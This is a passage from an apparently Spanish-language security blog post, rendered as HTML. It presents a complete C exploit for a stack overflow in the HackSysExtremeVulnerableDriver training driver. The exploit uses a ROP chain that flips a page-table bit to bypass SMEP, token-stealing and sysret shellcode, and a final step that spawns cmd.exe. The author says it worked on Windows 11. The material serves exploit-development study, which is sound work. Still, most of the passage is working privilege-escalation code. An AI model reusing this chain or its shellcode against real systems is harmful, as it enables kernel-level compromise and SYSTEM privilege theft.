+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to calculate bytes needed for device driver entries&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpImageBase <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, dwBytesNeeded))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate heap for lpImageBase</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(lpImageBase, dwBytesNeeded, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] EnumDeviceDrivers: %d&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pKernelBaseAddress <span style="color:#f92672">=</span> ((ULONG_PTR <span style="color:#f92672">*</span>)lpImageBase)[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Kernel Base Address: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pKernelBaseAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pKernelBaseAddress;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GenerateBuffer</span>(<span style="color:#66d9ef">int64_t</span> <span style="color:#f92672">*</span>buffer, <span style="color:#66d9ef">int64_t</span> kernel_base, LPVOID shellcode)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">259</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Generating buffer to bypass VPS and disable SMEP</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Prepare RDX register for later. This is needed for the XOR operation */</span>
+</span></span><span style="display:flex;"><span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f99ce</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000008</span>; <span style="color:#75715e">// Set RDX to 0x08, we will need this to accomplish the XOR
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       userland code. The setup is as follows:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         RAX -&gt; VOID *MiGetPteAddress(
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">           ( RCX == PTE / Userland Code )
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         );
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       Once the call is complete RAX should contain the pointer to our PTE. */</span>
+</span></span><span style="display:flex;"><span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa74d93</span>; <span style="color:#75715e">// pop rcx ; ret     [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int64_t</span>)shellcode;     <span style="color:#75715e">// *shellcode        [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x26b560</span>; <span style="color:#75715e">// MiGetPteAddress() [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
+</span></span><span style="display:flex;"><span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2ffbfb</span>; <span style="color:#75715e">// sub rax, rdx ; ret                [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa6f2f5</span>; <span style="color:#75715e">// push rax ; pop rbx ; ret          [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f99ce</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000004</span>; <span style="color:#75715e">// When we XOR the PTE by 0x4 we flip the 2nd bit (U -&gt; K)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2107b2</span>; <span style="color:#75715e">// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Now we can spray our shellcode address since SMEP and VPS should be bypassed */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xC</span>; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int64_t</span>)shellcode;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Calling shellcode: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcode);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    HANDLE hHEVD                          <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    DWORD bytesReturned                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> buffer[BUFFER_SIZE]           <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> kernelBaseAddr                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    LPVOID lpMemory                       <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// movabs rax, qword ptr gs:[0x188]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0xb8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\xc1</span><span style="color:#e6db74">&#34;</span>                                 <span style="color:#75715e">// mov rcx, rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb2\x04</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// mov dl, 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0x448]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x2d\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// sub rax, 0x448
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\x90\x40\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// cmp byte ptr [rax + 0x440], dl
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xeb</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// jne 0x1017
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x90\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rdx, qword ptr [rax + 0x4b8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\x91\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov qword ptr [rcx + 0x4b8], rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// movabs rax, qword ptr gs:[0x188]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x8b\x88\xe4\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov cx, word ptr [rax + 0x1e4]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\xff\xc1</span><span style="color:#e6db74">&#34;</span>                                 <span style="color:#75715e">// inc cx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x89\x88\xe4\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov word ptr [rax + 0x1e4], cx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x90\x90\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rdx, qword ptr [rax + 0x90]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x8a\x68\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rcx, qword ptr [rdx + 0x168]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4c\x8b\x9a\x78\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov r11, qword ptr [rdx + 0x178]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\xa2\x80\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rsp, qword ptr [rdx + 0x180]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\xaa\x58\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rbp, qword ptr [rdx + 0x158]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// xor eax, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\x01\xf8</span><span style="color:#e6db74">&#34;</span>                                 <span style="color:#75715e">// swapgs 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x0f\x07</span><span style="color:#e6db74">&#34;</span>;                                <span style="color:#75715e">// sysretq
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> shellcodeLength <span style="color:#f92672">=</span> (<span style="color:#ae81ff">58</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">71</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    kernelBaseAddr <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelBaseAddress</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Getting a handle on HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                        (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                        NULL,
+</span></span><span style="display:flex;"><span>                        OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                        FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                        NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating RWX memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    lpMemory <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
+</span></span><span style="display:flex;"><span>                            shellcodeLength,
+</span></span><span style="display:flex;"><span>                            (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                            PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Copying shellcode into RWX memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(lpMemory, shellcode, shellcodeLength);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Spraying return address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpMemory);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">GenerateBuffer</span>(buffer, kernelBaseAddr, lpMemory);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering control code 0x222003</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                    TRIGGER_BUFFER_OVERFLOW_STACK,
+</span></span><span style="display:flex;"><span>                    buffer,
+</span></span><span style="display:flex;"><span>                    BUFFER_SIZE,
+</span></span><span style="display:flex;"><span>                    NULL,
+</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>                    NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="explotación-rip--tearhttpsyoutubezzmg9ryewowsimh-prkm1kze7zvhq">Explotación (<a href="https://youtu.be/zZMg9ryeWOw?si=mh-PrkM1kze7zVHq">Rip &amp; Tear</a>)</h1>
+<p>Al escribir este artículo tenía tanta confianza en mi técnica, que lo probé con la última versión de Windows 11 y tabajo!</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/poc.gif" alt="alt text"></p>
+<p>Es importante tener en cuenta que yo tenía que hacer modificaciones a la información mencionada dentro de este artículo por Windows 11. Por ejemplo, &ldquo;Token Stealing Shellcode&rdquo; distancias han cambiado. Esta fue una observación interesante y planeo hacer cambios a Sickle para adaptarse a los cambios.</p>
+<h1 id="recursos">Recursos</h1>
+<pre tabindex="0"><code>https://connormcgarr.github.io/pte-overwrites/
+https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo
+https://wumb0.in/finding-the-base-of-the-windows-kernel.html
+https://idafchev.github.io/research/2023/06/30/Vulnerable_Driver_Part2.html
+https://fluidattacks.com/blog/hevd-smep-bypass/
+https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#
+https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf
+https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
